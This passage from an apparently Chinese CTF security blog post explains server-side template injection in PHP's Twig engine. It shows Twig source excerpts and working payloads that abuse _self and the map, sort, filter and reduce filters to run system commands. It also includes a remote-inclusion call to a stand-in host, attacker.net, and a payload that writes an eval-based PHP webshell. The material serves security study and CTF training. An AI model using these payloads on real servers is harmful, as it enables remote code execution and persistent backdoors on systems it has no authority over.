+// Output: 0, 1, 2, 3,</code></pre>
+
+<p><strong>引入其他模板</strong></p>
+<p>Twig 提供的 <code>include</code> 函数可以使你更方便地在模板中引入模板，并将该模板已渲染后的内容返回到当前模板：</p>
+<pre><code class="highlight plaintext">&#123;&#123; include(&#x27;sidebar.html&#x27;) &#125;&#125;</code></pre>
+
+<h4 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h4><h5 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h5><p>在 Twig 1.x 中存在三个全局变量：</p>
+<ul>
+<li><code>_self</code>：引用当前模板的实例。</li>
+<li><code>_context</code>：引用当前上下文。</li>
+<li><code>_charset</code>：引用当前字符集。</li>
+</ul>
+<p>对应的代码是：</p>
+<pre><code class="highlight plaintext">protected $specialVars = [
+        &#x27;_self&#x27; =&gt; &#x27;$this&#x27;,
+        &#x27;_context&#x27; =&gt; &#x27;$context&#x27;,
+        &#x27;_charset&#x27; =&gt; &#x27;$this-&gt;env-&gt;getCharset()&#x27;,
+    ];</code></pre>
+
+<p>这里主要就是利用 <code>_self</code> 变量，它会返回当前 <code>\Twig\Template</code> 实例，并提供了指向 <code>Twig_Environment</code> 的 <code>env</code> 属性，这样我们就可以继续调用 <code>Twig_Environment</code> 中的其他方法，从而进行 SSTI。</p>
+<p>比如以下 Payload 可以调用 <code>setCache</code> 方法改变 Twig 加载 PHP 文件的路径，在 <code>allow_url_include</code> 开启的情况下我们可以通过改变路径实现远程文件包含：</p>
+<pre><code class="highlight plaintext">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</code></pre>
+
+<p>此外还有 <code>getFilter</code> 方法：</p>
+<pre><code class="highlight plaintext">public function getFilter($name)
+  &#123;
+    ...
+    foreach ($this-&gt;filterCallbacks as $callback) &#123;
+    if (false !== $filter = call_user_func($callback, $name)) &#123;
+      return $filter;
+    &#125;
+  &#125;
+  return false;
+&#125;
+
+public function registerUndefinedFilterCallback($callable)
+&#123;
+  $this-&gt;filterCallbacks[] = $callable;
+&#125;</code></pre>
+
+<p>我们在 <code>getFilter</code> 里发现了危险函数 <code>call_user_func</code>。通过传递参数到该函数中，我们可以调用任意 PHP 函数。Payload 如下：</p>
+<pre><code class="highlight plaintext">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;
+// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+
+<p>但是在 Twig 2.x 及 Twig 3.x 以后，<code>_self</code> 的作用发生了变化，只能返回当前实例名字符串：</p>
+<h5 id="Twig-2-x-3-x"><a href="#Twig-2-x-3-x" class="headerlink" title="Twig 2.x &#x2F; 3.x"></a>Twig 2.x &#x2F; 3.x</h5><p>到了 Twig 2.x &#x2F; 3.x 版本中，<code>__self</code> 变量在 SSTI 中早已失去了他的作用，但我们可以借助新版本中的一些过滤器实现攻击目的。</p>
+<p><strong>map</strong></p>
+<p>进行一个映射关系</p>
+<pre><code class="highlight plaintext">map 过滤器将箭头函数应用于序列或映射的元素。箭头函数接收序列或映射的值
+
+&#123;% set people = [
+    &#123;first: &quot;Bob&quot;, last: &quot;Smith&quot;&#125;,
+    &#123;first: &quot;Alice&quot;, last: &quot;Dupond&quot;&#125;,
+] %&#125;
+
+&#123;&#123; people|map(p =&gt; &quot;#&#123;p.first&#125; #&#123;p.last&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;
+&#123;# outputs Bob Smith, Alice Dupond #&#125;
+箭头函数还将键作为第二个参数接收
+
+&#123;% set people = &#123;
+    &quot;Bob&quot;: &quot;Smith&quot;,
+    &quot;Alice&quot;: &quot;Dupond&quot;,
+&#125; %&#125;
+
+&#123;&#123; people|map((value, key) =&gt; &quot;#&#123;key&#125; #&#123;value&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;
+&#123;# outputs Bob Smith, Alice Dupond #&#125;
+请注意，箭头函数可以访问当前上下文。</code></pre>
+
+<p>也就是说当我们使用<code>map</code>时</p>
+<p><code>&#123;&#123;["Mark"]|map((arg)=>"Hello #&#123;arg&#125;!")&#125;&#125;</code>会被编译成<code>twig_array_map([0 =&gt; &quot;Mark&quot;], function ($__arg__) use ($context, $macros) &#123; $context[&quot;arg&quot;] = $__arg__; return (&quot;hello &quot; . ($context[&quot;arg&quot;] ?? null))&#125;)</code></p>
+<p>这个 <code>twig_array_map</code> 函数的源码如下：</p>
+<pre><code class="highlight plaintext">function twig_array_map($array, $arrow)
+&#123;
+    $r = [];
+    foreach ($array as $k =&gt; $v) &#123;
+        $r[$k] = $arrow($v, $k);    // 直接将 $arrow 当做函数执行
+    &#125;
+
+    return $r;
+&#125;</code></pre>
+
+<p>从上面的代码我们可以看到，传入的 <code>$arrow</code> 直接就被当成函数执行，即 <code>$arrow($v, $k)</code>，而 <code>$v</code> 和 <code>$k</code> 分别是 <code>$array</code> 中的 value 和 key。<code>$array</code> 和 <code>$arrow</code> 都是我们我们可控的，那我们可以不传箭头函数，直接传一个可传入两个参数的、能够命令执行的危险函数名即可实现命令执行</p>
+<pre><code class="highlight plaintext">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;]|map(&quot;passthru&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;]|map(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>
+
+<p>如果函数被禁止了也可以通过写马来进行RCE</p>
+<pre><code class="highlight plaintext">&#123;&#123;[&quot;phpinfo();&quot;]|map(&quot;assert&quot;)|join(&quot;,&quot;)&#125;&#125;
+&#123;&#123;&#123;&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;    // 写 Webshell</code></pre>
+
+<p><strong>sort</strong></p>
+<p>这个 <code>sort</code> 筛选器可以用来对数组排序。</p>
+<pre><code class="highlight plaintext">&#123;% for user in users|sort %&#125;
+    ...
+&#123;% endfor %&#125;</code></pre>
+
+<p>可以传递一个箭头函数来配置排序</p>
+<pre><code class="highlight plaintext">&#123;% set fruits = [
+    &#123;name: &#x27;Apples&#x27;, quantity: 5&#125;,
+    &#123;name: &#x27;Oranges&#x27;, quantity: 2&#125;,
+    &#123;name: &#x27;Grapes&#x27;, quantity: 4&#125;,
+] %&#125;
+
+&#123;% for fruit in fruits|sort((a, b) =&gt; a.quantity &lt;=&gt; b.quantity)|column(&#x27;name&#x27;) %&#125;
+    &#123;&#123; fruit &#125;&#125;
+&#123;% endfor %&#125;
+
+&#123;# output in this order: Oranges, Grapes, Apples #&#125;</code></pre>
+
+<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_sort_filter</code> 函数，这个 <code>twig_sort_filter</code> 函数的源码如下：</p>
+<pre><code class="highlight plaintext">function twig_sort_filter($array, $arrow = null)
+&#123;
+    if ($array instanceof \Traversable) &#123;
+        $array = iterator_to_array($array);
+    &#125; elseif (!\is_array($array)) &#123;
+        throw new RuntimeError(sprintf(&#x27;The sort filter only works with arrays or &quot;Traversable&quot;, got &quot;%s&quot;.&#x27;, \gettype($array)));
+    &#125;
+
+    if (null !== $arrow) &#123;
+        uasort($array, $arrow);    // 直接被 uasort 调用 
+    &#125; else &#123;
+        asort($array);
+    &#125;
+
+    return $array;
+&#125;</code></pre>
+
+<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>uasort</code> 函数调用。众所周知 <code>uasort</code> 函数可以使用用户自定义的比较函数对数组中的元素按键值进行排序，如果我们自定义一个危险函数，将造成代码执行或命令执行：</p>
+<pre><code class="highlight plaintext">php &gt; $arr = [&quot;id&quot;,0];
+php &gt; usort($arr,&quot;system&quot;);
+uid=0(root) gid=0(root) groups=0(root)
+php &gt;</code></pre>
+
+<p>知道了做这些我们便可以构造 Payload 了：</p>
+<pre><code class="highlight plaintext">&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;system&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;passthru&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;, 0]|sort(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>
+
+<p><strong>filter</strong></p>
+<p>这个 <code>filter</code> 过滤器使用箭头函数来过滤序列或映射中的元素。箭头函数用于接收序列或映射的值：</p>
+<pre><code class="highlight plaintext">&#123;% set lists = [34, 36, 38, 40, 42] %&#125;
+&#123;&#123; lists|filter(v =&gt; v &gt; 38)|join(&#x27;, &#x27;) &#125;&#125;
+
+// Output: 40, 42</code></pre>
+
+<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_array_filter</code> 函数，这个 <code>twig_array_filter</code> 函数的源码如下：</p>
+<pre><code class="highlight plaintext">function twig_array_filter($array, $arrow)
+&#123;
+    if (\is_array($array)) &#123;
+        return array_filter($array, $arrow, \ARRAY_FILTER_USE_BOTH);    // $array 和 $arrow 直接被 array_filter 函数调用
+    &#125;
+
+    // the IteratorIterator wrapping is needed as some internal PHP classes are \Traversable but do not implement \Iterator
+    return new \CallbackFilterIterator(new \IteratorIterator($array), $arrow);
+&#125;</code></pre>
+
+<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>array_filter</code> 函数调用。 <code>array_filter</code> 函数可以用回调函数过滤数组中的元素，如果我们自定义一个危险函数，将造成代码执行或命令执行：</p>
+<pre><code class="highlight plaintext">php &gt; $arr = [&quot;id&quot;];
+php &gt; array_filter($arr,&quot;system&quot;);
+uid=0(root) gid=0(root) groups=0(root)
+php &gt;</code></pre>
+
+<pre><code class="highlight plaintext">poc:
+&#123;&#123;[&quot;id&quot;]|filter(&quot;system&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;]|filter(&quot;passthru&quot;)&#125;&#125;
+&#123;&#123;[&quot;id&quot;]|filter(&quot;exec&quot;)&#125;&#125;    // 无回显</code></pre>
+
+
+
+<p><strong>reduce</strong></p>
+<p>这个 <code>reduce</code> 过滤器使用箭头函数迭代地将序列或映射中的多个元素缩减为单个值。箭头函数接收上一次迭代的返回值和序列或映射的当前值：</p>
+<pre><code class="highlight plaintext">&#123;% set numbers = [1, 2, 3] %&#125;
+&#123;&#123; numbers|reduce((carry, v) =&gt; carry + v) &#125;&#125;
+// Output: 6</code></pre>
+
+<p>类似于 <code>map</code>，模板编译的过程中会进入 <code>twig_array_reduce</code> 函数，这个 <code>twig_array_reduce</code> 函数的源码如下：</p>
+<pre><code class="highlight plaintext">function twig_array_reduce($array, $arrow, $initial = null)
+&#123;
+    if (!\is_array($array)) &#123;
+        $array = iterator_to_array($array);
+    &#125;
+
+    return array_reduce($array, $arrow, $initial);    // $array, $arrow 和 $initial 直接被 array_reduce 函数调用
+&#125;</code></pre>
+
+<p>从源码中可以看到，<code>$array</code> 和 <code>$arrow</code> 直接被 <code>array_filter</code> 函数调用。 <code>array_reduce</code> 函数可以发送数组中的值到用户自定义函数，并返回一个字符串。如果我们自定义一个危险函数，将造成代码执行或命令执行。</p>
+<p>直接给出 Payload：</p>
+<pre><code class="highlight plaintext">&#123;&#123;[0, 0]|reduce(&quot;system&quot;, &quot;id&quot;)&#125;&#125;
+&#123;&#123;[0, 0]|reduce(&quot;passthru&quot;, &quot;id&quot;)&#125;&#125;
+&#123;&#123;[0, 0]|reduce(&quot;exec&quot;, &quot;id&quot;)&#125;&#125;    // 无回显</code></pre>
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://ayan0.top">AyaN0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://ayan0.top/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/">https://ayan0.top/2025/01/22/SSTI%E6%BC%8F%E6%B4%9E/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://ayan0.top" target="_blank">Blog of AyaN0</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF-Web/">-CTF -Web</a></div><div class="post-share"><div class="social-share" data-image="/img/ari.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/01/25/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" title="文件上传漏洞"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-25</div><div class="info-item-2">文件上传漏洞</div></div><div class="info-2"><div class="info-item-1">文件上传漏洞大部分是需要回显储存路径才能打后续操作的，如果没有回显路径要不再想想。？(雾) 前端检测前端检测上传文件的后缀，js检测直接禁用js 后端检测检测content-type检测你发包的Content-Type参数来判断文件上传类型  一般你改一下content-type就可以绕过了 检测文件头判断文件类型字义，使用getimagesize()函数来获取文件的MIME类型，此时检测的不是数据包中的content-type，而是文件头 这种时候伪造一下就可以 gif(GIF89a) : 47 49 46 38 39 61  jpg、jpeg : FF D8 FF  png : 89 50 4E 47 0D...</div></div></div></a><a class="pagination-related" href="/2025/01/10/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" title="文件包含"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-01-10</div><div class="info-item-2">文件包含</div></div><div class="info-2"><div class="info-item-1">文件包含漏洞依赖于include(),require(),include_once(),require_once()这些函数的漏洞 什么叫包含呢？以PHP为例，我们常常把可重复使用的函数写入到单个文件中，在使用该函数时，直接调用此文件，而无需再次编写函数，这一过程叫做包含 有时候由于网站功能需求，会让前端用户选择要包含的文件，而开发人员又没有对要包含的文件进行安全考虑，就导致攻击者可以通过修改文件的位置来让后台执行任意文件，从而导致文件包含漏洞。 #...</div></div></div></a><a class="pagination-related" href="/2025/03/15/%E8%AF%A6%E8%A7%A3XSS%E6%B3%A8%E5%85%A5/" title="详解XSS注入"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-15</div><div class="info-item-2">详解XSS注入</div></div><div class="info-2"><div class="info-item-1">XSS注入&quot;球球你了！就让我插一句话，我什么都会做的!!!&quot;  &quot;byd被我注入了吧&quot;  认识XSS攻击XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。  XSS 的运行原理是将恶意的 script 脚本插入进 html&#x2F;css&#x2F;js 文件当中。（通过在html标准的语句后触发事件，而事件则是执行恶意js 代码）   作为一种HTML注入攻击，XSS攻击的核心思想就是在HTML页面中注入恶意代码，而XSS采用的注入方式是非常巧妙的。在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。 由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="author-info-name">AyaN0</div><div class="author-info-description">”如果是你的话，是否会选择继续前进呢"</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/kisakiayano" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:1594453512@qq.com" target="_blank" title="Email"><i class="fas fa-envelope-open-text"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客喵</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SSTI-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E6%BC%8F%E6%B4%9E"><span class="toc-text">SSTI(模板注入)漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">模板注入漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%BC%8F%E6%B4%9E"><span class="toc-text">确定漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E5%B1%82%EF%BC%9A"><span class="toc-text">第一层：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E5%B1%82%EF%BC%9A"><span class="toc-text">第二层：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E5%B1%82%EF%BC%9A"><span class="toc-text">第三层：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Python%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-text">Python模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#jinja2"><span class="toc-text">jinja2</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%E7%BB%93%E6%9E%84"><span class="toc-text">语法结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jinja2%E7%9A%84%E4%BF%84%E7%BD%97%E6%96%AF%E5%A5%97%E5%A8%83"><span class="toc-text">jinja2的俄罗斯套娃</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#jinja2%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="toc-text">jinja2的过滤</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%93%E9%A9%AC%E7%8E%AF%E8%8A%82-%E5%BE%85%E8%A1%A5%E5%AE%8C"><span class="toc-text">打马环节(待补完)</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tornado"><span class="toc-text">Tornado</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E4%BA%86%E8%A7%A3"><span class="toc-text">基础了解</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%80%A7"><span class="toc-text">特性</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5"><span class="toc-text">PHP模板注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Smarty"><span class="toc-text">Smarty</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87self%E8%8E%B7%E5%8F%96Smarty%E7%B1%BB%E5%86%8D%E8%B0%83%E7%94%A8%E5%85%B6%E9%9D%99%E6%80%81%E6%96%B9%E6%B3%95"><span class="toc-text">通过self获取Smarty类再调用其静态方法</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A0%87%E7%AD%BE"><span class="toc-text">标签:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#twig"><span class="toc-text">twig</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%E7%BB%93%E6%9E%84-1"><span class="toc-text">语法结构</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Twig-1-x"><span class="toc-text">Twig 1.x</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#Twig-2-x-3-x"><span class="toc-text">Twig 2.x &#x2F; 3.x</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/%E5%88%B7%E9%A2%98%E8%9B%86%E6%9D%A5%E5%92%AF-CTFshow/" title="刷题蛆来咯-CTFshow">刷题蛆来咯-CTFshow</a><time datetime="2025-07-07T06:19:38.000Z" title="发表于 2025-07-07 14:19:38">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/07/114514%E5%88%86%E9%92%9F%E8%83%BD%E4%BA%86%E8%A7%A3SSRF%E5%90%97/" title="114514分钟能了解SSRF吗">114514分钟能了解SSRF吗</a><time datetime="2025-07-07T05:05:59.000Z" title="发表于 2025-07-07 13:05:59">2025-07-07</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/%E7%A3%A8%E5%A5%BD%E7%9A%84%E5%88%A9%E5%89%91-PHP%E5%8E%9F%E7%94%9F%E7%B1%BB/" title="磨好的利剑:PHP原生类">磨好的利剑:PHP原生类</a><time datetime="2025-07-01T05:58:51.000Z" title="发表于 2025-07-01 13:58:51">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/" title="Nosql注入">Nosql注入</a><time datetime="2025-07-01T02:35:37.000Z" title="发表于 2025-07-01 10:35:37">2025-07-01</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/06/22/2025%E5%B9%B4%E4%B8%AD%E6%80%BB%E7%BB%93/" title="2025年中总结">2025年中总结</a><time datetime="2025-06-22T08:06:33.000Z" title="发表于 2025-06-22 16:06:33">2025-06-22</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2025 By AyaN0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><div class="aplayer no-destroy" data-id="2688080408" data-server="netease" data-type="song" data-fixed="true" data-autoplay="true"> </div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/click-show-text.min.js" data-mobile="false" data-text="Venus,Mars,Diana,Minerva,Ceres,Vulcan,Pluto,Vulcan,Juno,Mercury,Vesta,Saturn,Proserpina,Neptune,Jupiter" data-fontsize="15px" data-random="false" async="async"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><script>(() => {
   const destroyAplayer = () => {
     if (window.aplayers) {
       for (let i = 0; i < window.aplayers.length; i++) {
